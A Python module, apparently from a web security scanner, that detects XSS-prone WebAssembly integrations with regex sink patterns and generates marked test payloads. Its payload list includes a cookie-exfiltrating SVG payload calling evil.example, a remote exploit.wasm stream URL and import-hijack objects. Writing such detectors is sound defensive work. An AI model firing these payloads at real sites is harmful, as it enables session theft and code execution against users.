"""
WebAssembly (WASM) XSS Detection Module.

Detects XSS vulnerabilities in WebAssembly code:
- WASM binary injection
- Wasm.Module exploitation
- WASM function pointer hijacking
- WASM memory manipulation XSS
- Import-object hijack (imports expose eval/document/etc. to WASM)
- Streaming compile from user-controlled URL
- Memory dump to DOM / URL / Blob
- Base64-hidden WASM modules (magic bytes AGFzbQ)
"""

import re
from typing import Dict, List, Optional, Set, Tuple
from dataclasses import dataclass
from enum import Enum


# ============================================================================
# Enum
# ============================================================================
class WASMSink(Enum):
    """WASM-related XSS sink types."""
    WASM_MODULE = "wasm_module"
    WASM_INSTANCE = "wasm_instance"
    WASM_MEMORY = "wasm_memory"
    WASM_TABLE = "wasm_table"
    WASM_FUNCTION = "wasm_function"
    WASM_GLOBAL = "wasm_global"


@dataclass
class WASMXSSVulnerability:
    """WASM XSS vulnerability."""
    sink: WASMSink
    injection_point: str
    context: str
    payload: str
    severity: str
    category: str = ""                  # e.g. "import_hijack", "memory_dump"
    pattern: str = ""                   # regex that matched
    reflected: bool = False             # True when response_body confirms reflection

    def is_rce_capable(self) -> bool:
        """True when the pattern leads to code execution, not just HTML injection."""
        rce_markers = (
            "eval(", "new Function(", "setTimeout(", "setInterval(",
            "instance.exports.", "WebAssembly.instantiate",
        )
        return any(m in self.payload or m in self.pattern for m in rce_markers)


class WASMXSSDetector:
    """
    Advanced WebAssembly XSS detector.

    Detects XSS vulnerabilities in WASM code and its integration with the
    surrounding JavaScript runtime.
    """

    # ------------------------------------------------------------------
    # WASM sink patterns  (WASM_SINK_PATTERNS is an alias, both work)
    # ------------------------------------------------------------------
    WASM_PATTERNS: Dict[WASMSink, List[str]] = {

        WASMSink.WASM_MODULE: [
            # --- Original ---
            r'WebAssembly\.Module\s*\(',
            r'WebAssembly\.compile\s*\(',
            r'WebAssembly\.compileStreaming\s*\(',
            # --- Explicit constructor / validation ---
            r'new\s+WebAssembly\.Module\s*\(',
            r'WebAssembly\.Module\.exports',
            r'WebAssembly\.validate\s*\(',
            # --- Streaming from untrusted URL ---
            r'WebAssembly\.compileStreaming\s*\(\s*(?:fetch|await\s+fetch)\s*\(',
            r'WebAssembly\.compileStreaming\s*\(\s*(?:request|params|query|body|input|user)',
            # --- Dynamic import ---
            r'import\s*\([^)]*\.wasm',
            r'importScripts\s*\([^)]*\.wasm',
        ],

        WASMSink.WASM_INSTANCE: [
            # --- Original ---
            r'WebAssembly\.Instance\s*\(',
            r'WebAssembly\.instantiate\s*\(',
            r'WebAssembly\.instantiateStreaming\s*\(',
            # --- Explicit constructor ---
            r'new\s+WebAssembly\.Instance\s*\(',
            # --- Streaming from untrusted URL ---
            r'WebAssembly\.instantiateStreaming\s*\(\s*(?:fetch|await\s+fetch)\s*\(',
            r'WebAssembly\.instantiateStreaming\s*\(\s*(?:request|params|query|body|input|user)',
            r'\.instantiate\s*\([^)]*(?:user|input|param|query|body|attr|props)',
            # --- Import-object hijack ---
            r'importObject\s*[:=]',
            r'imports\s*[:=]\s*\{[^}]*\beval\b',
            r'imports\s*[:=]\s*\{[^}]*\bFunction\b',
            r'imports\s*[:=]\s*\{[^}]*\bdocument\.',
            r'imports\s*[:=]\s*\{[^}]*\bpostMessage\b',
            r'WebAssembly\.instantiate\s*\([^,]+,\s*(?:window|globalThis|self)\s*\)',
        ],

        WASMSink.WASM_MEMORY: [
            # --- Original ---
            r'WebAssembly\.Memory\s*\(',
            r'\.memory',
            r'new\s+WebAssembly\.Memory',
            # --- Memory access from instance ---
            r'instance\.exports\.memory',
            r'memory\.buffer',
            r'\.buffer\s*=\s*new\s+ArrayBuffer',
            # --- Threads / shared memory ---
            r'SharedArrayBuffer\s*\(',
            r'Atomics\.',
            # --- Views onto WASM memory ---
            r'new\s+Uint8Array\s*\(\s*[^)]*memory\.buffer',
            r'new\s+DataView\s*\(\s*[^)]*memory\.buffer',
            # --- Growth / reallocation ---
            r'\.grow\s*\(',
        ],

        WASMSink.WASM_TABLE: [
            # --- Original ---
            r'WebAssembly\.Table\s*\(',
            r'\.table',
            r'new\s+WebAssembly\.Table',
            # --- Table read/write (function-pointer hijack) ---
            r'table\.get\s*\(',
            r'table\.set\s*\(',
            r'table\.grow\s*\(',
            r'call_indirect',
            r'\.exports\.table',
        ],

        WASMSink.WASM_FUNCTION: [
            # --- Original ---
            r'WebAssembly\.Function\s*\(',
            r'\.exports\.',
            r'instance\.exports',
            # --- Export enumeration ---
            r'instance\.exports\s*\[',
            r'Object\.keys\s*\(\s*instance\.exports',
            r'Object\.values\s*\(\s*instance\.exports',
            r'instance\.exports\.\w+\s*\(',
            # --- Export as callback / messaging ---
            r'call_indirect',
            r'postMessage\s*\(\s*instance\.exports',
            r'addEventListener\s*\([^,]+,\s*instance\.exports',
        ],

        WASMSink.WASM_GLOBAL: [
            # --- Original ---
            r'WebAssembly\.Global\s*\(',
            r'\.global',
            r'new\s+WebAssembly\.Global',
            # --- Mutable global assignment ---
            r'instance\.exports\.\w+\.value\s*=',
            r'WebAssembly\.Global\s*\(\s*[^)]*,\s*["\']mutable["\']',
            r'\.global\s*\.\s*value\s*=',
        ],
    }

    # Alias for symmetry with the other detectors
    WASM_SINK_PATTERNS = WASM_PATTERNS

    # ------------------------------------------------------------------
    # Dangerous WASM integration patterns
    # ------------------------------------------------------------------
    DANGEROUS_PATTERNS: List[str] = [
        # --- Direct code execution ---
        r'eval\s*\(\s*instance\.exports',
        r'new\s+Function\s*\(\s*instance\.exports',
        r'setTimeout\s*\(\s*instance\.exports',
        r'setInterval\s*\(\s*instance\.exports',

        # --- Direct DOM injection sinks ---
        r'innerHTML\s*=\s*instance\.exports',
        r'outerHTML\s*=\s*instance\.exports',
        r'document\.write\s*\(\s*instance\.exports',
        r'insertAdjacentHTML\s*\([^,]*,\s*instance\.exports',
        r'\.html\s*\(\s*instance\.exports',                                    # jQuery
        r'dangerouslySetInnerHTML\s*=\s*\{[^}]*instance\.exports',            # React
        r'v-html\s*=\s*["\']instance\.exports',                               # Vue
        r'\[innerHTML\]\s*=\s*["\']instance\.exports',                        # Angular
        r'x-html\s*=\s*["\']instance\.exports',                               # Alpine

        # --- Export / memory reads flowing to DOM or URLs ---
        r'String\.fromCharCode\.apply\s*\(\s*null\s*,\s*new\s+Uint8Array\s*\(\s*[^)]*memory',
        r'TextDecoder\([^)]*\)\.decode\s*\(\s*[^)]*memory',
        r'new\s+TextDecoder\([^)]*\)\.decode\s*\(\s*[^)]*\.buffer',
        r'btoa\s*\(\s*String\.fromCharCode\.apply[^)]*memory',
        r'URL\.createObjectURL\s*\(\s*new\s+Blob\s*\(\s*\[\s*[^)]*memory',
        r'\.src\s*=\s*instance\.exports',
        r'\.href\s*=\s*instance\.exports',
        r'location\.(?:href|assign|replace)\s*=\s*instance\.exports',
        r'window\.open\s*\(\s*instance\.exports',

        # --- Exports used as user-input handlers ---
        r'instance\.exports\.\w+\s*\(\s*(?:user|input|param|query|body|attr|props)',
        r'instance\.exports\s*\.\s*main\s*\(\s*(?:user|input)',
        r'WebAssembly\.instantiate\s*\(\s*(?:user|input|param)',

        # --- Messaging / Worker / SharedMemory surfaces ---
        r'postMessage\s*\(\s*[^)]*memory\.buffer',
        r'postMessage\s*\(\s*instance\.exports',
        r'new\s+Worker\s*\([^)]*wasm',
        r'importScripts\s*\([^)]*wasm',

        # --- Instantiation-import hijack ---
        r'importObject\s*[:=]\s*\{\s*[^}]*\beval\b',
        r'importObject\s*[:=]\s*\{\s*[^}]*\bFunction\b',
        r'importObject\s*[:=]\s*\{\s*[^}]*\bdocument\.',
        r'importObject\s*[:=]\s*\{[^}]*postMessage',
        r'WebAssembly\.instantiate\s*\([^,]+,\s*(?:window|globalThis|self)\s*\)',

        # --- Streaming from user-controlled URL ---
        r'compileStreaming\s*\(\s*(?:fetch|await\s+fetch)\s*\(\s*(?:user|input|params|query|body|request\.)',
        r'instantiateStreaming\s*\(\s*(?:fetch|await\s+fetch)\s*\(\s*(?:user|input|params|query|body|request\.)',
    ]

    # ------------------------------------------------------------------
    # WASM file patterns
    # ------------------------------------------------------------------
    WASM_FILE_PATTERNS: List[str] = [
        # --- Original ---
        r'\.wasm',
        r'application/wasm',
        r'wasm-binary',

        # --- MIME + header variants ---
        r'application/wasm;',
        r'application/octet-stream.*\.wasm',
        r'Content-Type:\s*application/wasm',

        # --- Magic bytes: 0x00 0x61 0x73 0x6D ("\0asm") ---
        r'\\x00\\x61\\x73\\x6d',
        r'\\0asm',
        r'AGFzbQ',                                           # Base64 prefix of \0asm

        # --- Data URIs / Blob URLs ---
        r'data:application/wasm;base64,',
        r'data:application/wasm;',
        r'blob:[^"\']+\.wasm',
        r'URL\.createObjectURL\s*\(\s*new\s+Blob',

        # --- Build artifacts / cache-busting ---
        r'\.wasm\?v=',
        r'\.wasm#',
        r'\.wasm\.(?:js|map|br|gz)',
        r'wasm-[a-f0-9]{8,}',

        # --- Streaming-compilation entry points ---
        r'compileStreaming',
        r'instantiateStreaming',
        r'webassembly\.(?:instantiate|compile)',

        # --- Toolchain fingerprints ---
        r'wasm-pack',
        r'wasm-bindgen',
        r'emscripten',
        r'assemblyscript',
        r'rust-?wasm',

        # --- CDN paths ---
        r'(?:unpkg|jsdelivr|cdnjs)\.com[^"\']*\.wasm',
        r'/wasm/',
        r'/static/wasm/',
        r'/assets/.*\.wasm',
    ]

    # ------------------------------------------------------------------
    # Category-specific pattern sets (used by the new check_* methods)
    # ------------------------------------------------------------------
    IMPORT_HIJACK_PATTERNS: List[str] = [
        r'importObject\s*[:=]\s*\{\s*[^}]*\beval\b',
        r'importObject\s*[:=]\s*\{\s*[^}]*\bFunction\b',
        r'importObject\s*[:=]\s*\{\s*[^}]*\bdocument\.',
        r'importObject\s*[:=]\s*\{[^}]*postMessage',
        r'WebAssembly\.instantiate\s*\([^,]+,\s*(?:window|globalThis|self)\s*\)',
        r'imports?\s*[:=]\s*\{[^}]*\b(?:eval|Function|document|postMessage|fetch)\b',
    ]

    STREAMING_FROM_USER_PATTERNS: List[str] = [
        r'compileStreaming\s*\(\s*(?:fetch|await\s+fetch)\s*\(\s*(?:user|input|params|query|body|request\.)',
        r'instantiateStreaming\s*\(\s*(?:fetch|await\s+fetch)\s*\(\s*(?:user|input|params|query|body|request\.)',
        r'\.instantiate\s*\([^)]*(?:user|input|param|query|body|attr|props)',
        r'WebAssembly\.(?:instantiate|compile)\s*\(\s*(?:user|input|param|query|body)',
    ]

    MEMORY_TO_DOM_PATTERNS: List[str] = [
        r'String\.fromCharCode\.apply\s*\(\s*null\s*,\s*new\s+Uint8Array\s*\(\s*[^)]*memory',
        r'TextDecoder\([^)]*\)\.decode\s*\(\s*[^)]*memory',
        r'new\s+TextDecoder\([^)]*\)\.decode\s*\(\s*[^)]*\.buffer',
        r'innerHTML\s*=\s*[^;]*memory',
        r'outerHTML\s*=\s*[^;]*memory',
        r'document\.write\s*\(\s*[^)]*memory',
        r'eval\s*\(\s*[^)]*memory',
        r'new\s+Function\s*\(\s*[^)]*memory',
    ]

    MEMORY_TO_URL_PATTERNS: List[str] = [
        r'URL\.createObjectURL\s*\(\s*new\s+Blob\s*\(\s*\[\s*[^)]*memory',
        r'location\.(?:href|assign|replace)\s*=\s*[^;]*memory',
        r'\.src\s*=\s*[^;]*memory',
        r'\.href\s*=\s*[^;]*memory',
        r'window\.open\s*\(\s*[^)]*memory',
    ]

    # ------------------------------------------------------------------
    # XSS payloads for WASM testing
    # ------------------------------------------------------------------
    WASM_XSS_PAYLOADS: List[str] = [
        # --- Baseline XSS (original) ---
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",

        # --- Export-string → DOM reflection ---
        "wasm-string:<script>alert(1)</script>",
        "wasm-string:<img src=x onerror=alert(document.cookie)>",
        "wasm-string:<svg/onload=alert(document.domain)>",
        "wasm-string:<iframe srcdoc='<script>alert(1)</script>'>",
        "wasm-string:<body onload=alert(1)>",

        # --- Memory dump → sink ---
        "memory-dump:<script>alert(1)</script>",
        "memory-dump:<img src=x onerror=alert(1)>",
        "memory-dump:<svg onload=fetch('https://evil.example/?c='+document.cookie)>",
        "memory-dump:\"><script>alert(String.fromCharCode(88,83,83))</script>",

        # --- Function / export-name injection ---
        "func-name:<script>alert(1)</script>",
        "export-name:<script>alert(1)</script>",
        "export-name:\"><img src=x onerror=alert(1)>",
        "custom-section:<script>alert(1)</script>",
        "producer-section:<script>alert(1)</script>",

        # --- Import-object hijack ---
        "{'env':{'alert':alert}}",
        "{'js':{'eval':eval}}",
        "{'env':{'innerHTML':'<script>alert(1)</script>'}}",
        "{'env':{'document':document}}",
        "{'env':{'postMessage':postMessage}}",
        "{'env':{'fetch':fetch}}",

        # --- Base64-encoded XSS (WASM often carries payloads as base64) ---
        "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",             # base64 of <script>alert(1)</script>
        "PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==",          # base64 of <img src=x onerror=alert(1)>
        "PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+",                       # base64 of <svg onload=alert(1)>

        # --- Data-URI / Blob URL WASM (streaming-compilation abuse) ---
        "data:application/wasm;base64,AGFzbQEAAAA=",
        "data:application/wasm;base64,AGFzbQEAAAABBQFgAAF/AwIBAAcCAQAPAQAKBgEEQQAQAA==",
        "blob:wasm-payload",
        "wasm-shellcode:base64,YWxlcnQoMSk=",

        # --- Streaming from user-controlled URL ---
        "stream-url:https://evil.example/exploit.wasm",
        "stream-url:data:application/wasm;base64,AGFzbQEAAAA=",
        "stream-url:blob:https://evil.example/<uuid>",
        "stream-url://evil.example/exploit.wasm",
    ]

    def __init__(self) -> None:
        self._detected_sinks: Set[WASMSink] = set()
        self._vulnerabilities: List[WASMXSSVulnerability] = []

    # ------------------------------------------------------------------
    # Payload helpers
    # ------------------------------------------------------------------
    def _mark_payload(self, payload: str, marker: str) -> str:
        """
        Replace `alert(...)` variants with the caller-supplied marker and
        guarantee the marker is present.

        Detection contract: the final string always contains `marker`, so
        `marker in response_body` is a reliable reflection check.
        """
        marked = payload
        # Canonical replacements first
        for variant in ("alert(1)", "alert('XSS')", 'alert("XSS")',
                        "alert(document.cookie)", "alert(document.domain)"):
            marked = marked.replace(variant, f"alert('{marker}')")
        # If marker still missing, append an inert comment (safe in HTML,
        # JS, and JSON contexts) so detection always works
        if marker not in marked:
            marked = f"{marked}<!--{marker}-->"
        return marked

    @staticmethod
    def strip_payload_prefix(payload: str) -> Tuple[str, str]:
        """
        Split a category-prefixed payload into (category, body).

        Non-prefixed payloads return ('', payload).
        """
        prefixes = (
            "wasm-string:", "memory-dump:", "func-name:", "export-name:",
            "custom-section:", "producer-section:", "simd-payload:",
            "atomic-payload:", "table-set:", "wasm-shellcode:",
            "stream-url:",
        )
        for p in prefixes:
            if payload.startswith(p):
                return p.rstrip(":"), payload[len(p):]
        return "", payload

    def payloads_by_category(self, category: str) -> List[str]:
        """
        Return the payloads matching a given category.

        `category=""` returns non-prefixed (baseline) payloads.
        """
        out: List[str] = []
        for p in self.WASM_XSS_PAYLOADS:
            cat, _ = self.strip_payload_prefix(p)
            if cat == category:
                out.append(p)
        return out

    # ------------------------------------------------------------------
    # Detection
    # ------------------------------------------------------------------
    def detect_wasm_sinks(
        self,
        js_content: str,
        html_content: str = "",
    ) -> Set[WASMSink]:
        """Detect WASM-related XSS sinks."""
        combined = f"{js_content}\n{html_content}"
        detected: Set[WASMSink] = set()

        for sink, patterns in self.WASM_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, combined, re.IGNORECASE):
                    detected.add(sink)
                    break

        self._detected_sinks = detected
        return detected

    def detect_wasm_files(
        self,
        html_content: str,
        js_content: str = "",
    ) -> List[str]:
        """Detect WASM file references."""
        combined = f"{html_content}\n{js_content}"
        wasm_files: List[str] = []

        for pattern in self.WASM_FILE_PATTERNS:
            for match in re.finditer(pattern, combined, re.IGNORECASE):
                start = max(0, match.start() - 100)
                end = min(len(combined), match.end() + 100)
                context = combined[start:end]
                url_match = re.search(
                    r'["\']([^"\']*\.wasm[^"\']*)["\']',
                    context, re.IGNORECASE,
                )
                if url_match:
                    wasm_files.append(url_match.group(1))

        # Ordered de-dup
        return list(dict.fromkeys(wasm_files))

    def detect_base64_wasm(self, content: str) -> List[str]:
        """
        Detect base64-encoded WASM modules.

        The WASM magic bytes `\\0asm` encode to `AGFzbQ` in base64, so any
        base64 blob starting with that prefix is almost certainly a WASM
        module. Returns the matching base64 substrings.
        """
        hits: List[str] = []
        for m in re.finditer(r'AGFzbQ[A-Za-z0-9+/=]{20,}', content):
            hits.append(m.group(0))
        return list(dict.fromkeys(hits))

    # ------------------------------------------------------------------
    # Integration checks
    # ------------------------------------------------------------------
    def check_dangerous_integration(
        self,
        js_content: str,
        marker: str = "xoxss",
        max_payloads_per_pattern: Optional[int] = None,
    ) -> List[WASMXSSVulnerability]:
        """
        Check for dangerous WASM integration patterns.

        Args:
            js_content: JavaScript source
            marker: Unique marker
            max_payloads_per_pattern: cap payloads emitted per matched
                pattern on a line. `None` = all payloads (original behaviour).
                Set to a small int (e.g. 3) when scanning large files.
        """
        vulnerabilities: List[WASMXSSVulnerability] = []
        lines = js_content.split("\n")
        payloads = (
            self.WASM_XSS_PAYLOADS if max_payloads_per_pattern is None
            else self.WASM_XSS_PAYLOADS[:max_payloads_per_pattern]
        )

        for line_num, line in enumerate(lines, 1):
            for pattern in self.DANGEROUS_PATTERNS:
                if not re.search(pattern, line, re.IGNORECASE):
                    continue
                for payload in payloads:
                    vulnerabilities.append(WASMXSSVulnerability(
                        sink=WASMSink.WASM_FUNCTION,
                        injection_point=f"line_{line_num}",
                        context="Dangerous WASM integration with DOM sink",
                        payload=self._mark_payload(payload, marker),
                        severity="high",
                        category="dom_injection",
                        pattern=pattern,
                    ))
        return vulnerabilities

    def check_wasm_memory_xss(
        self,
        js_content: str,
        marker: str = "xoxss",
    ) -> List[WASMXSSVulnerability]:
        """Check for XSS via WASM memory manipulation (memory → DOM)."""
        vulnerabilities: List[WASMXSSVulnerability] = []
        lines = js_content.split("\n")

        for line_num, line in enumerate(lines, 1):
            if not re.search(
                r'wasmMemory|memory\.buffer|new\s+Uint8Array.*memory',
                line, re.IGNORECASE,
            ):
                continue

            matched = None
            for pattern in self.MEMORY_TO_DOM_PATTERNS:
                if re.search(pattern, line, re.IGNORECASE):
                    matched = pattern
                    break
            if matched is None and not re.search(
                r'innerHTML|outerHTML|document\.write|eval|new\s+Function',
                line, re.IGNORECASE,
            ):
                continue

            for payload in self.WASM_XSS_PAYLOADS:
                vulnerabilities.append(WASMXSSVulnerability(
                    sink=WASMSink.WASM_MEMORY,
                    injection_point=f"line_{line_num}",
                    context="WASM memory content written to DOM",
                    payload=self._mark_payload(payload, marker),
                    severity="critical",
                    category="memory_dump_to_dom",
                    pattern=matched or "",
                ))
        return vulnerabilities

    def check_wasm_function_pointer_hijack(
        self,
        js_content: str,
        marker: str = "xoxss",
    ) -> List[WASMXSSVulnerability]:
        """Check for WASM function pointer hijacking vulnerabilities."""
        vulnerabilities: List[WASMXSSVulnerability] = []
        lines = js_content.split("\n")

        for line_num, line in enumerate(lines, 1):
            if not re.search(r'table\.set|table\.get|wasmTable', line, re.IGNORECASE):
                continue
            if not re.search(r'event\.|request\.|user|input', line, re.IGNORECASE):
                continue

            for payload in self.WASM_XSS_PAYLOADS:
                vulnerabilities.append(WASMXSSVulnerability(
                    sink=WASMSink.WASM_TABLE,
                    injection_point=f"line_{line_num}",
                    context="WASM table manipulation with user input",
                    payload=self._mark_payload(payload, marker),
                    severity="high",
                    category="table_hijack",
                ))
        return vulnerabilities

    def check_import_hijack(
        self,
        js_content: str,
        marker: str = "xoxss",
    ) -> List[WASMXSSVulnerability]:
        """
        Detect import-object hijack: WASM instantiation passing an object
        that exposes eval / Function / document / postMessage / fetch to
        the module, or passing `window` / `globalThis` / `self` directly.
        """
        vulnerabilities: List[WASMXSSVulnerability] = []
        lines = js_content.split("\n")

        for line_num, line in enumerate(lines, 1):
            for pattern in self.IMPORT_HIJACK_PATTERNS:
                if not re.search(pattern, line, re.IGNORECASE):
                    continue
                for payload in self.payloads_by_category(""):
                    vulnerabilities.append(WASMXSSVulnerability(
                        sink=WASMSink.WASM_INSTANCE,
                        injection_point=f"line_{line_num}",
                        context="WASM import object exposes dangerous globals",
                        payload=self._mark_payload(payload, marker),
                        severity="critical",
                        category="import_hijack",
                        pattern=pattern,
                    ))
        return vulnerabilities

    def check_streaming_compile(
        self,
        js_content: str,
        marker: str = "xoxss",
    ) -> List[WASMXSSVulnerability]:
        """
        Detect streaming compilation from user-controlled URL, which lets
        an attacker supply the WASM binary and (if the import object is
        loose) achieve code execution.
        """
        vulnerabilities: List[WASMXSSVulnerability] = []
        lines = js_content.split("\n")

        for line_num, line in enumerate(lines, 1):
            for pattern in self.STREAMING_FROM_USER_PATTERNS:
                if not re.search(pattern, line, re.IGNORECASE):
                    continue
                for payload in self.payloads_by_category("stream-url"):
                    vulnerabilities.append(WASMXSSVulnerability(
                        sink=WASMSink.WASM_MODULE,
                        injection_point=f"line_{line_num}",
                        context="Streaming compilation from user-controlled URL",
                        payload=self._mark_payload(payload, marker),
                        severity="critical",
                        category="streaming_user_url",
                        pattern=pattern,
                    ))
        return vulnerabilities

    def check_memory_to_url(
        self,
        js_content: str,
        marker: str = "xoxss",
    ) -> List[WASMXSSVulnerability]:
        """Detect WASM memory flowing to a URL, Blob, src, or href."""
        vulnerabilities: List[WASMXSSVulnerability] = []
        lines = js_content.split("\n")

        for line_num, line in enumerate(lines, 1):
            for pattern in self.MEMORY_TO_URL_PATTERNS:
                if not re.search(pattern, line, re.IGNORECASE):
                    continue
                for payload in self.payloads_by_category("memory-dump"):
                    vulnerabilities.append(WASMXSSVulnerability(
                        sink=WASMSink.WASM_MEMORY,
                        injection_point=f"line_{line_num}",
                        context="WASM memory written to URL/Blob",
                        payload=self._mark_payload(payload, marker),
                        severity="high",
                        category="memory_to_url",
                        pattern=pattern,
                    ))
        return vulnerabilities

    def check_export_to_dom(
        self,
        js_content: str,
        marker: str = "xoxss",
    ) -> List[WASMXSSVulnerability]:
        """
        Focused check for `instance.exports.* → DOM` / `→ eval` flows.

        Complements `check_dangerous_integration` by emitting the
        `wasm-string:` and `export-name:` payload categories that target
        export-name reflection specifically.
        """
        vulnerabilities: List[WASMXSSVulnerability] = []
        lines = js_content.split("\n")

        dom_sinks = (
            r'innerHTML|outerHTML|insertAdjacentHTML|document\.write|'
            r'\.html\s*\(|dangerouslySetInnerHTML|v-html|\[innerHTML\]|x-html|'
            r'eval\s*\(|new\s+Function\s*\('
        )
        for line_num, line in enumerate(lines, 1):
            if not re.search(dom_sinks, line, re.IGNORECASE):
                continue
            if not re.search(r'instance\.exports', line, re.IGNORECASE):
                continue
            for payload in (
                self.payloads_by_category("wasm-string")
                + self.payloads_by_category("export-name")
            ):
                vulnerabilities.append(WASMXSSVulnerability(
                    sink=WASMSink.WASM_FUNCTION,
                    injection_point=f"line_{line_num}",
                    context="instance.exports value reaches a DOM/code sink",
                    payload=self._mark_payload(payload, marker),
                    severity="high",
                    category="export_to_dom",
                ))
        return vulnerabilities

    # ------------------------------------------------------------------
    # Orchestration
    # ------------------------------------------------------------------
    def scan_for_wasm_xss(
        self,
        html_content: str,
        js_content: str = "",
        marker: str = "xoxss",
        response_body: Optional[str] = None,
        max_payloads_per_pattern: Optional[int] = None,
    ) -> List[WASMXSSVulnerability]:
        """
        Scan for WASM XSS vulnerabilities.

        Args:
            html_content: HTML source code
            js_content: JavaScript source code
            marker: Unique marker
            response_body: if provided, only keep findings whose payload
                (with marker) appears verbatim in the response
            max_payloads_per_pattern: forwarded to check_dangerous_integration;
                `None` = original behaviour
        """
        self._vulnerabilities = []

        sinks = self.detect_wasm_sinks(js_content, html_content)
        if not sinks:
            return self._vulnerabilities

        # Dangerous integration (all sinks)
        self._vulnerabilities.extend(self.check_dangerous_integration(
            js_content, marker,
            max_payloads_per_pattern=max_payloads_per_pattern,
        ))

        # Memory → DOM
        if WASMSink.WASM_MEMORY in sinks:
            self._vulnerabilities.extend(
                self.check_wasm_memory_xss(js_content, marker)
            )

        # Function-pointer hijack
        if WASMSink.WASM_TABLE in sinks:
            self._vulnerabilities.extend(
                self.check_wasm_function_pointer_hijack(js_content, marker)
            )

        # New: import hijack (needs WASM_INSTANCE)
        if WASMSink.WASM_INSTANCE in sinks:
            self._vulnerabilities.extend(
                self.check_import_hijack(js_content, marker)
            )

        # New: streaming compile (needs WASM_MODULE)
        if WASMSink.WASM_MODULE in sinks:
            self._vulnerabilities.extend(
                self.check_streaming_compile(js_content, marker)
            )

        # New: memory → URL/Blob (needs WASM_MEMORY)
        if WASMSink.WASM_MEMORY in sinks:
            self._vulnerabilities.extend(
                self.check_memory_to_url(js_content, marker)
            )

        # New: focused export → DOM check (needs WASM_FUNCTION)
        if WASMSink.WASM_FUNCTION in sinks:
            self._vulnerabilities.extend(
                self.check_export_to_dom(js_content, marker)
            )

        # Optional reflection filter
        if response_body is not None:
            filtered: List[WASMXSSVulnerability] = []
            for v in self._vulnerabilities:
                if marker in response_body:
                    v.reflected = True
                    filtered.append(v)
            self._vulnerabilities = filtered

        return self._vulnerabilities

    # ------------------------------------------------------------------
    # Reporting
    # ------------------------------------------------------------------
    def assess_wasm_risk(
        self,
        vulnerabilities: List[WASMXSSVulnerability],
    ) -> str:
        """Assess overall WASM XSS risk."""
        if not vulnerabilities:
            return "none"

        if any(v.is_rce_capable() for v in vulnerabilities):
            return "critical"

        if any(v.severity == "critical" for v in vulnerabilities):
            return "critical"

        if any(v.severity == "high" for v in vulnerabilities):
            return "high"

        return "medium"

    def get_wasm_summary(self) -> Dict[str, object]:
        """Get a structured summary of WASM findings."""
        by_sink: Dict[str, int] = {s.value: 0 for s in WASMSink}
        by_severity: Dict[str, int] = {"critical": 0, "high": 0, "medium": 0, "low": 0}
        by_category: Dict[str, int] = {}

        for v in self._vulnerabilities:
            by_sink[v.sink.value] += 1
            by_severity[v.severity] = by_severity.get(v.severity, 0) + 1
            if v.category:
                by_category[v.category] = by_category.get(v.category, 0) + 1

        return {
            "total_vulnerabilities": len(self._vulnerabilities),
            "by_sink": by_sink,
            "by_severity": {k: v for k, v in by_severity.items() if v},
            "by_category": by_category,
            "rce_capable": sum(1 for v in self._vulnerabilities if v.is_rce_capable()),
            "reflected": sum(1 for v in self._vulnerabilities if v.reflected),
        }


__all__ = [
    "WASMSink",
    "WASMXSSDetector",
    "WASMXSSVulnerability",
]